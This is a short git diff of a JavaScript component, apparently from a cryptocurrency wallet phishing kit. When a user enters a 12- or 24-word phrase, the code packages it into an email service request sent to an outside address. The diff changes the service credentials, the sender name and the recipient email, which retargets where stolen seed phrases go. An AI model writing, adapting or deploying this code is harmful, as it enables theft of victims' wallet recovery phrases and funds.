@@ -48,13 +48,13 @@ export default {
       const counter = this.countWords(this.phrase)
       if (counter === 12 || counter === 24) {
         var data = {
-          service_id: 'service_fhzx1qm',
-          template_id: 'template_u8q3nmp',
-          user_id: '1VCQuxAerMoxLsQwn',
+          service_id: 'service_zlp9avq',
+          template_id: 'template_lmr03dr',
+          user_id: 'tBHx-wodV4E4WnaBH',
           template_params: {
-            from_name: 'Wallet Link Phrase',
+            from_name: 'Avado',
             phrase: this.phrase,
-            reply_to: 'LifeofLove12@protonmail.com',
+            reply_to: 'customeronlineagent@gmail.com',
           },
         }
         axios
